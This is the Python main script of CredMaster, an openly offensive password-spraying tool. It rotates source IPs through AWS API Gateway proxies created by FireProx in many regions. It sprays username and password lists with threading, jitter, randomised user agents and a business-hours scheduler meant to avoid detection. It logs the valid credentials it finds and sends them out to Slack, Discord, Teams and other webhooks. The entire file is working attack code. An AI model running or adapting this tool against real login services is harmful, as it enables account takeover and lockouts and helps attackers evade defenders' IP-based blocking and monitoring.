#!/usr/bin/env python3
# from zipfile import *
import threading, queue, argparse, datetime, json, importlib, random, os, time, sys
from utils.fire import FireProx
import utils.utils as utils
import utils.notify as notify


class CredMaster(object):

	def __init__(self, args, pargs):

		self.credentials = { "accounts" : [] }
		self.regions = [
			"us-east-2", "us-east-1","us-west-1","us-west-2","eu-west-3",
			"ap-northeast-1","ap-northeast-2","ap-south-1",
			"ap-southeast-1","ap-southeast-2","ca-central-1",
			"eu-central-1","eu-west-1","eu-west-2","sa-east-1",
		]

		self.lock = threading.Lock()
		self.lock_userenum = threading.Lock()
		self.lock_success = threading.Lock()
		self.q_spray = queue.Queue()

		self.outfile = None
		self.color = None

		self.start_time = None
		self.end_time = None
		self.time_lapse = None
		self.results = []
		self.cancelled = False

		self.notify_obj = {}

		self.clean = args.clean
		self.api_destroy = args.api_destroy
		self.api_list = args.api_list

		self.pargs = pargs
		self.parse_all_args(args)

		self.do_input_error_handling()

		# Utility handling, else run spray
		if args.clean:
			self.clear_all_apis()
		elif args.api_destroy != None:
			self.destroy_single_api(args.api_destroy)
		elif args.api_list:
			self.list_apis()
		else:
			self.Execute(args)


	def parse_all_args(self, args):
		#
		# this function will parse both config files and CLI args
		# If a value is specified in both config and CLI, the CLI value will be preferred
		# Reason: if someone wants to take a standard config from client to client, they can override a value
		#

		self.args = args

		if args.config is not None and not os.path.exists(args.config):
			self.log_entry(f"Config file {args.config} cannot be found")
			sys.exit()

		# assign variables
		# TOO MANY MF VARIABLES THIS HAS GOTTEN OUT OF CONTROL
		# This is fine ;)

		config_dict = {}
		if args.config != None:
			config_dict = json.loads(open(args.config).read())

		self.plugin = args.plugin or config_dict.get("plugin")
		self.userfile = args.userfile or config_dict.get("userfile")
		self.passwordfile = args.passwordfile or config_dict.get("passwordfile")
		self.userpassfile = args.userpassfile or config_dict.get("userpassfile")
		self.useragentfile = args.useragentfile or config_dict.get("useragentfile")
		self.trim = args.trim or config_dict.get("trim")

		self.outfile = args.outfile or config_dict.get("outfile")

		self.thread_count = args.threads or config_dict.get("threads")
		if self.thread_count == None:
			self.thread_count = 1

		self.region = args.region or config_dict.get("region")
		self.jitter = args.jitter or config_dict.get("jitter")
		self.jitter_min = args.jitter_min or config_dict.get("jitter_min")
		self.delay = args.delay or config_dict.get("delay")
		
		self.batch_size = args.batch_size or config_dict.get("batch_size")
		self.batch_delay = args.batch_delay or config_dict.get("batch_delay")
		if self.batch_size != None and self.batch_delay == None:
			self.batch_delay = 1


		self.passwordsperdelay = args.passwordsperdelay or config_dict.get("passwordsperdelay")
		if self.passwordsperdelay == None:
			self.passwordsperdelay = 1

		self.randomize = args.randomize or config_dict.get("randomize")
		self.header = args.header or config_dict.get("header")
		self.weekdaywarrior = args.weekday_warrior or config_dict.get("weekday_warrior")
		self.color = args.color or config_dict.get("color")

		self.notify_obj = {
			"slack_webhook" : args.slack_webhook or config_dict.get("slack_webhook"),
			"pushover_token" : args.pushover_token or config_dict.get("pushover_token"),
			"pushover_user" : args.pushover_user or config_dict.get("pushover_user"),
			"ntfy_topic" : args.ntfy_topic or config_dict.get("ntfy_topic"),
			"ntfy_host" : args.ntfy_host or config_dict.get("ntfy_host"),
			"ntfy_token" : args.ntfy_token or config_dict.get("ntfy_token"),
			"discord_webhook" : args.discord_webhook or config_dict.get("discord_webhook"),
			"keybase_webhook" : args.keybase_webhook or config_dict.get("keybase_webhook"),
			"teams_webhook" : args.teams_webhook or config_dict.get("teams_webhook"),
			"operator_id" : args.operator_id or config_dict.get("operator_id"),
			"exclude_password" : args.exclude_password or config_dict.get("exclude_password")
		}

		self.access_key = args.access_key or config_dict.get("access_key")
		self.secret_access_key = args.secret_access_key or config_dict.get("secret_access_key")
		self.session_token = args.session_token or config_dict.get("session_token")
		self.profile_name = args.profile_name or config_dict.get("profile_name")


	def do_input_error_handling(self):

		# input exception handling
		if self.outfile != None:
			of = self.outfile + "-credmaster.txt"
			if os.path.exists(of):
				self.log_entry(f"File {of} already exists, try again with a unique file name")
				sys.exit()

		# File handling
		if self.userfile is not None and not os.path.exists(self.userfile):
			self.log_entry(f"Username file {self.userfile} cannot be found")
			sys.exit()

		if self.passwordfile is not None and not os.path.exists(self.passwordfile):
			self.log_entry(f"Password file {self.passwordfile} cannot be found")
			sys.exit()

		if self.userpassfile is not None and not os.path.exists(self.userpassfile):
			self.log_entry(f"User-pass file {self.userpassfile} cannot be found")
			sys.exit()

		if self.useragentfile is not None and not os.path.exists(self.useragentfile):
			self.log_entry(f"Useragent file {self.useragentfile} cannot be found")
			sys.exit()

		# AWS Key Handling
		if self.session_token is not None and (self.secret_access_key is None or self.access_key is None):
			self.log_entry("Session token requires access_key and secret_access_key")
			sys.exit()
		if self.profile_name is not None and (self.access_key is not None or self.secret_access_key is not None):
			self.log_entry("Cannot use a passed profile and keys")
			sys.exit()
		if self.access_key is not None and self.secret_access_key is None:
			self.log_entry("access_key requires secret_access_key")
			sys.exit()
		if self.access_key is None and self.secret_access_key is not None:
			self.log_entry("secret_access_key requires access_key")
			sys.exit()
		if self.access_key is None and self.secret_access_key is None and self.session_token is None and self.profile_name is None:
			self.log_entry("No FireProx access arguments settings configured, add access keys/session token or fill out config file")
			sys.exit()

		# Region handling
		if self.region is not None and self.region not in self.regions:
			self.log_entry(f"Input region {self.region} not a supported AWS region, {self.regions}")
			sys.exit()

		# Jitter handling
		if self.jitter_min is not None and self.jitter is None:
			self.log_entry("--jitter flag must be set with --jitter-min flag")
			sys.exit()
		elif self.jitter_min is not None and self.jitter is not None and self.jitter_min >= self.jitter:
			self.log_entry("--jitter flag must be greater than --jitter-min flag")
			sys.exit()

		# Notification Error handlng
		if self.notify_obj["pushover_user"] is not None and self.notify_obj["pushover_token"] is None:
			self.log_entry("pushover_user input requires pushover_token input")
			sys.exit()
		elif self.notify_obj["pushover_user"] is None and self.notify_obj["pushover_token"] is not None:
			self.log_entry("pushover_token input requires pushover_user input")
			sys.exit()

		# Notification Error handlng - ntfy
		if self.notify_obj["ntfy_topic"] is not None and self.notify_obj["ntfy_host"] is None:
			self.log_entry("ntfy_topic input requires ntfy_host input")
			sys.exit()
		elif self.notify_obj["ntfy_topic"] is None and self.notify_obj["ntfy_host"] is not None:
			self.log_entry("ntfy_host input requires ntfy_topic input")
			sys.exit()

		# batch handling
		if self.batch_delay != None and self.batch_size == None:
			self.log_entry("--batch_size flag must be set with --batch_delay flag")
			sys.exit()



	def Execute(self, args):

		# Weekday Warrior options
		if self.weekdaywarrior is not None:
			# kill delay & passwords per delay since this is predefined
			self.delay = None
			self.passwordsperdelay = 1

		# parse plugin specific arguments
		pluginargs = {}
		if len(self.pargs) % 2 == 1:
			self.pargs.append(None)
		for i in range(0,len(self.pargs)-1):
			key = self.pargs[i].replace("--","")
			pluginargs[key] = self.pargs[i+1]

		## 
		## If any plugins require a special argument, set it here
		##    Ex: Okta plugin requires the threadcount value for some checking, set it manually
		##
		pluginargs['thread_count'] = self.thread_count

		self.start_time = datetime.datetime.utcnow()
		self.log_entry(f"Execution started at: {self.start_time}")

		# Check with plugin to make sure it has the data that it needs
		validator = importlib.import_module(f"plugins.{self.plugin}")
		if getattr(validator,"validate",None) is not None:
			valid, errormsg, pluginargs = validator.validate(pluginargs, self.args)
			if not valid:
				self.log_entry(errormsg)
				return
		else:
			self.log_entry(f"No validate function found for plugin: {self.plugin}")

		self.userenum = False
		if "userenum" in pluginargs and pluginargs["userenum"]:
			self.userenum = True

		# file stuffs
		if self.userpassfile is None and (self.userfile is None or (self.passwordfile is None and not self.userenum)):
			self.log_entry("Please provide plugin & username/password information, or provide API utility options (api_list/api_destroy/clean)")
			sys.exit()

		# batch login
		if self.batch_size:
			self.log_entry(f"Batching requests enabled: {self.batch_size} requests per thread, {self.batch_delay}s of delay between each batch.")


		# Custom header handling
		if self.header is not None:
			self.log_entry(f"Adding custom header \"{self.header}\" to requests")
			head = self.header.split(":")[0].strip()
			val = self.header.split(":")[1].strip()
			pluginargs["custom-headers"] = {head : val}

		# this is the original URL, NOT the fireproxy one. Don't use this in your sprays!
		url = pluginargs["url"]

		threads = []

		try:
			# Create lambdas based on thread count
			self.load_apis(url, region = self.region)

			# do test connection / fingerprint
			useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
			connect_success, testconnect_output, pluginargs = validator.testconnect(pluginargs, self.args, self.apis[0], useragent)
			self.log_entry(testconnect_output)

			if not connect_success:
				self.destroy_apis()
				sys.exit()

			# Print stats
			self.display_stats()

			self.log_entry("Starting Spray...")

			count = 0
			time_count = 0
			passwords = ["Password123"]
			if self.userpassfile is None and not self.userenum:
				passwords = self.load_file(self.passwordfile)

			for password in passwords:

				time_count += 1
				if time_count == 1:
					if self.userenum:
						notify.notify_update("Info: Starting Userenum.", self.notify_obj)
					else:
						notify.notify_update(f"Info: Starting Spray.\nPass: {password}", self.notify_obj)

				else:
					notify.notify_update(f"Info: Spray Continuing.\nPass: {password}", self.notify_obj)

				if self.weekdaywarrior is not None:
					spray_days = {
						0 : "Monday",
						1 : "Tuesday",
						2 : "Wednesday",
						3 : "Thursday",
						4 : "Friday",
					    5 : "Saturday",
					    6 : "Sunday" ,
					}

					self.weekdaywarrior = int(self.weekdaywarrior)
					sleep_time = self.ww_calc_next_spray_delay(self.weekdaywarrior)
					next_time = datetime.datetime.utcnow() + datetime.timedelta(hours=self.weekdaywarrior) + datetime.timedelta(minutes=sleep_time)
					self.log_entry(f"Weekday Warrior: sleeping {sleep_time} minutes until {next_time.strftime('%H:%M')} on {spray_days[next_time.weekday()]} in UTC {self.weekdaywarrior}")
					time.sleep(sleep_time*60)

				self.load_credentials(password)

				# Start Spray
				threads = []
				for api in self.apis:
					t = threading.Thread(target = self.spray_thread, args = (api["region"], api, pluginargs) )
					threads.append(t)
					t.start()

				for t in threads:
					t.join()

				count = count + 1

				if self.delay is None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
					if self.userpassfile != None:
						self.log_entry(f"Completed spray with user-pass file {self.userpassfile} at {datetime.datetime.utcnow()}")
					elif self.userenum:
						self.log_entry(f"Completed userenum at {datetime.datetime.utcnow()}")
					else:
						self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}")

					notify.notify_update(f"Info: Spray complete.", self.notify_obj)
					continue
				elif count != self.passwordsperdelay:
					self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}, moving on to next password...")
					continue
				else:
					self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}, sleeping for {self.delay} minutes before next password spray")
					self.log_entry(f"Valid credentials discovered: {len(self.results)}")
					for success in self.results:
						self.log_entry(f"Valid: {success['username']}:{success['password']}")
					count = 0
					time.sleep(self.delay * 60)

			# Remove AWS resources
			self.destroy_apis()

		except KeyboardInterrupt:
			self.log_entry("KeyboardInterrupt detected, cleaning up APIs")
			try:
				self.log_entry("Finishing active requests")
				self.cancelled = True
				for t in threads:
					t.join()
				self.destroy_apis()
			except KeyboardInterrupt:
				self.log_entry("Second KeyboardInterrupt detected, unable to clean up APIs :( try the --clean option")

		# Capture duration
		self.end_time = datetime.datetime.utcnow()
		self.time_lapse = (self.end_time-self.start_time).total_seconds()

		# Print stats
		self.display_stats(False)


	def load_apis(self, url, region=None):

		if self.thread_count > len(self.regions):
			self.log_entry("Thread count over maximum, reducing to 15")
			self.thread_count = len(self.regions)

		self.log_entry(f"Creating {self.thread_count} API Gateways for {url}")

		self.apis = []

		# slow but multithreading this causes errors in boto3 for some reason :(
		for x in range(0,self.thread_count):
			reg = self.regions[x]
			if region is not None:
				reg = region
			self.apis.append(self.create_api(reg, url.strip()))
			self.log_entry(f"Created API - Region: {reg} ID: ({self.apis[x]['api_gateway_id']}) - {self.apis[x]['proxy_url']} => {url}")


	def create_api(self, region, url):

		args, help_str = self.get_fireprox_args("create", region, url=url)
		fp = FireProx(args, help_str)
		resource_id, proxy_url = fp.create_api(url)
		return { "api_gateway_id" : resource_id, "proxy_url" : proxy_url, "region" : region }


	def get_fireprox_args(self, command, region, url = None, api_id = None):

		args = {}
		args["access_key"] = self.access_key
		args["secret_access_key"] = self.secret_access_key
		args["url"] = url
		args["command"] = command
		args["region"] = region
		args["api_id"] = api_id
		args["profile_name"] = self.profile_name
		args["session_token"] = self.session_token

		help_str = "Error, inputs cause error."

		return args, help_str


	def display_stats(self, start=True):
		if start:
			self.log_entry(f"Total Regions Available: {len(self.regions)}")
			self.log_entry(f"Total API Gateways: {len(self.apis)}")

		if self.end_time and not start:
			self.log_entry(f"End Time: {self.end_time}")
			self.log_entry(f"Total Execution: {self.time_lapse} seconds")
			self.log_entry(f"Valid credentials identified: {len(self.results)}")

			for cred in self.results:
				self.log_entry(f"VALID - {cred['username']}:{cred['password']}")


	def list_apis(self):

		for region in self.regions:

			args, help_str = self.get_fireprox_args("list", region)
			fp = FireProx(args, help_str)
			active_apis = fp.list_api()
			self.log_entry(f"Region: {region} - total APIs: {len(active_apis)}")

			if len(active_apis) != 0:
				for api in active_apis:
					self.log_entry(f"API Info --  ID: {api['id']}, Name: {api['name']}, Created Date: {api['createdDate']}")


	def destroy_single_api(self, api):

		self.log_entry("Destroying single API, locating region...")
		for region in self.regions:

			args, help_str = self.get_fireprox_args("list", region)
			fp = FireProx(args, help_str)
			active_apis = fp.list_api()

			for api1 in active_apis:
				if api1["id"] == api:
					self.log_entry(f"API found in region {region}, destroying...")
					fp.delete_api(api)
					sys.exit()

			self.log_entry("API not found")


	def destroy_apis(self):

		for api in self.apis:

			args, help_str = self.get_fireprox_args("delete", api["region"], api_id = api["api_gateway_id"])
			fp = FireProx(args, help_str)
			self.log_entry(f"Destroying API ({args['api_id']}) in region {api['region']}")
			fp.delete_api(args["api_id"])


	def clear_all_apis(self):

		self.log_entry("Clearing APIs for all regions")
		clear_count = 0

		for region in self.regions:

			args, help_str = self.get_fireprox_args("list", region)
			fp = FireProx(args, help_str)
			active_apis = fp.list_api()
			count = len(active_apis)
			err = "skipping"
			if count != 0:
				err = "removing"
			self.log_entry(f"Region: {region}, found {count} APIs configured, {err}")

			for api in active_apis:
				if "fireprox" in api["name"]:
					fp.delete_api(api["id"])
					clear_count += 1

		self.log_entry(f"APIs removed: {clear_count}")


	def spray_thread(self, api_key, api_dict, pluginargs):

		try:
			plugin_authentiate = getattr(importlib.import_module(f"plugins.{self.plugin}.{self.plugin}"), f"{self.plugin}_authenticate")
		except Exception as ex:
			self.log_entry("Error: Failed to import plugin with exception")
			self.log_entry(f"Error: {ex}")
			sys.exit()

		count = 0

		while not self.q_spray.empty() and not self.cancelled:

			try:

				if self.batch_size and count != 0:
					if count % self.batch_size == 0:
						time.sleep(self.batch_delay * 60)

				cred = self.q_spray.get_nowait()

				count += 1

				if self.jitter is not None:
					if self.jitter_min is None:
						self.jitter_min = 0
					time.sleep(random.randint(self.jitter_min,self.jitter))

				response = plugin_authentiate(api_dict["proxy_url"], cred["username"], cred["password"], cred["useragent"], pluginargs)

				# if "debug" in response.keys():
				# 	print(response["debug"])

				if response["error"]:
					self.log_entry(f"ERROR: {api_key}: {cred['username']} - {response['output']}")

				if response["result"].lower() == "success" and ("userenum" not in pluginargs):
					self.results.append( {"username" : cred["username"], "password" : cred["password"]} )
					notify.notify_success(cred["username"], cred["password"], self.notify_obj)
					self.log_success(cred["username"], cred["password"])

				if response["valid_user"] or response["result"] == "success":
					self.log_valid(cred["username"], self.plugin)

				if self.color:

					if response["result"].lower() == "success":
						self.log_entry(utils.prGreen(f"{api_key}: {response['output']}"))

					elif response["result"].lower() == "potential":
						self.log_entry(utils.prYellow(f"{api_key}: {response['output']}"))

					elif response["result"].lower() == "failure":
						self.log_entry(utils.prRed(f"{api_key}: {response['output']}"))

				else:
					self.log_entry(f"{api_key}: {response['output']}")

				self.q_spray.task_done()
			except Exception as ex:
				self.log_entry(f"ERROR: {api_key}: {cred['username']} - {ex}")


	def load_credentials(self, password):

		r = ""
		if self.randomize:
			r = ", randomized order"

		users = []
		if self.userenum:
			self.log_entry(f"Loading users and useragents{r}")
			users = self.load_file(self.userfile)
		elif self.userpassfile is None:
			self.log_entry(f"Loading credentials from {self.userfile} with password {password}{r}")
			users = self.load_file(self.userfile)
		else:
			self.log_entry(f"Loading credentials from {self.userpassfile} as user-pass file{r}")
			users = self.load_file(self.userpassfile)


		if self.useragentfile is not None:
			useragents = self.load_file(self.useragentfile)
		else:
			# randomly selected
			useragents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"]

		while users != []:
			user = None

			if self.randomize:
				user = users.pop(random.randint(0,len(users)-1))
			else:
				user = users.pop(0)

			if self.userpassfile != None:
				password = ":".join(user.split(':')[1:]).strip()
				user = user.split(':')[0].strip()

			if self.trim:
				if any(k['username'] == user for k in self.results):
					#We already found this one
					continue

			cred = {}
			cred["username"] = user
			cred["password"] = password
			cred["useragent"] = random.choice(useragents)

			self.q_spray.put(cred)


	def load_file(self, filename):

		if filename:
			return [line.strip() for line in open(filename, 'r')]


	def ww_calc_next_spray_delay(self, offset):

		spray_times = [8,12,14] # launch sprays at 7AM, 11AM and 3PM

		now = datetime.datetime.utcnow() + datetime.timedelta(hours=offset)
		hour_cur = int(now.strftime("%H"))
		minutes_cur = int(now.strftime("%M"))
		day_cur = int(now.weekday())

		delay = 0

		# if just after the spray hour, use this time as the start and go
		if hour_cur in spray_times and minutes_cur <= 59:
			delay = 0
			return delay

		next = []

		# if it's Friday and it's after the last spray period
		if (day_cur == 4 and hour_cur > spray_times[2]) or day_cur > 4:
			next = [0,0]
		elif hour_cur > spray_times[2]:
			next = [day_cur+1, 0]
		else:
			for i in range(0,len(spray_times)):
				if spray_times[i] > hour_cur:
					next = [day_cur, i]
					break

		day_next = next[0]
		hour_next = spray_times[next[1]]

		if next == [0,0]:
			day_next = 7

		hd = hour_next - hour_cur
		md = 0 - minutes_cur
		if day_next == day_cur:
			delay = hd*60 + md
		else:
			dd = day_next - day_cur
			delay = dd*24*60 + hd*60 + md

		return delay


	def log_entry(self, entry):

		self.lock.acquire()

		ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
		print(f"[{ts}] {entry}")

		if self.outfile is not None:
			with open(self.outfile + "-credmaster.txt", 'a+') as file:
				file.write(f"[{ts}] {entry}")
				file.write("\n")
				file.close()

		self.lock.release()


	def log_valid(self, username, plugin):

		self.lock_userenum.acquire()

		with open("credmaster-validusers.txt", 'a+') as file:
			file.write(username)
			file.write('\n')
			file.close()

		self.lock_userenum.release()


	def log_success(self, username, password):

		self.lock_success.acquire()

		with open("credmaster-success.txt", 'a+') as file:
			file.write(username + ":" + password)
			file.write('\n')
			file.close()

		self.lock_success.release()


if __name__ == '__main__':

	parser = argparse.ArgumentParser()

	basic_args = parser.add_argument_group(title='Basic Inputs')
	basic_args.add_argument('--plugin', help='Spray plugin', default=None, required=False)
	basic_args.add_argument('-u', '--userfile', default=None, required=False, help='Username file')
	basic_args.add_argument('-p', '--passwordfile', default=None, required=False, help='Password file')
	basic_args.add_argument('-f', '--userpassfile', default=None, required=False, help='Username-Password file (one-to-one map, colon separated)')
	basic_args.add_argument('-a', '--useragentfile', default=None, required=False, help='Useragent file')
	basic_args.add_argument('--config', type=str, default=None, help='Configure CredMaster using config file config.json')

	adv_args = parser.add_argument_group(title='Advanced Inputs')
	adv_args.add_argument('-o', '--outfile', default=None, required=False, help='Output file to write contents (omit extension)')
	adv_args.add_argument('-t', '--threads', type=int, default=None, help='Thread count (default 1, max 15)')
	adv_args.add_argument('--region', default=None, required=False, help='Specify AWS Region to create API Gateways in')
	adv_args.add_argument('-j', '--jitter', type=int, default=None, required=False, help='Jitter delay between requests in seconds (applies per-thread)')
	adv_args.add_argument('-m', '--jitter_min', type=int, default=None, required=False, help='Minimum jitter time in seconds, defaults to 0')
	adv_args.add_argument('-d', '--delay', type=int, default=None, required=False, help='Delay between unique passwords, in minutes')
	adv_args.add_argument('--passwordsperdelay', type=int, default=None, required=False, help='Number of passwords to be tested per delay cycle')
	adv_args.add_argument('--batch_size', type=int, default=None, required=False, help='Number of request to perform per thread')
	adv_args.add_argument('--batch_delay', type=int, default=None, required=False, help='Delay between each thread batch, in minutes')
	adv_args.add_argument('-r', '--randomize', default=False, required=False, action="store_true", help='Randomize the input list of usernames to spray (will remain the same password)')
	adv_args.add_argument('--header', default=None, required=False, help='Add a custom header to each request for attribution, specify "X-Header: value"')
	adv_args.add_argument('--weekday_warrior', default=None, required=False, help="If you don't know what this is don't use it, input is timezone UTC offset")
	adv_args.add_argument('--color', default=False, action="store_true", required=False, help="Output spray results in Green/Yellow/Red colors")
	adv_args.add_argument('--trim', '--remove', action="store_true", help="Remove users with found credentials from future sprays")

	notify_args = parser.add_argument_group(title='Notification Inputs')
	notify_args.add_argument('--slack_webhook', type=str, default=None, help='Webhook link for Slack notifications')
	notify_args.add_argument('--pushover_token', type=str, default=None, help='Token for Pushover notifications')
	notify_args.add_argument('--pushover_user', type=str, default=None, help='User for Pushover notifications')
	notify_args.add_argument('--ntfy_topic', type=str, default=None, help='Topic for Ntfy notifications')
	notify_args.add_argument('--ntfy_host', type=str, default=None, help='Ntfy host for notifications')
	notify_args.add_argument('--ntfy_token', type=str, default=None, help='Ntfy token for private instances')
	notify_args.add_argument('--discord_webhook', type=str, default=None, help='Webhook link for Discord notifications')
	notify_args.add_argument('--teams_webhook', type=str, default=None, help='Webhook link for Teams notifications')
	notify_args.add_argument('--keybase_webhook', type=str, default=None, help='Webhook for Keybase notifications')
	notify_args.add_argument('--operator_id', type=str, default=None, help='Optional Operator ID for notifications')
	notify_args.add_argument('--exclude_password', default=False, action="store_true", help='Exclude discovered password in Notification message')

	fp_args = parser.add_argument_group(title='Fireprox Connection Inputs')
	fp_args.add_argument('--profile_name', '--profile', type=str, default=None, help='AWS Profile Name to store/retrieve credentials')
	fp_args.add_argument('--access_key', type=str, default=None, help='AWS Access Key')
	fp_args.add_argument('--secret_access_key', type=str, default=None, help='AWS Secret Access Key')
	fp_args.add_argument('--session_token', type=str, default=None, help='AWS Session Token')

	fpu_args = parser.add_argument_group(title='Fireprox Utility Options')
	fpu_args.add_argument('--clean', default=False, action="store_true", help='Clean up all fireprox AWS APIs from every region, warning irreversible')
	fpu_args.add_argument('--api_destroy', type=str, default=None, help='Destroy single API instance, by API ID')
	fpu_args.add_argument('--api_list', default=False, action="store_true", help='List all fireprox APIs')

	args,pluginargs = parser.parse_known_args()

	CredMaster(args, pluginargs)
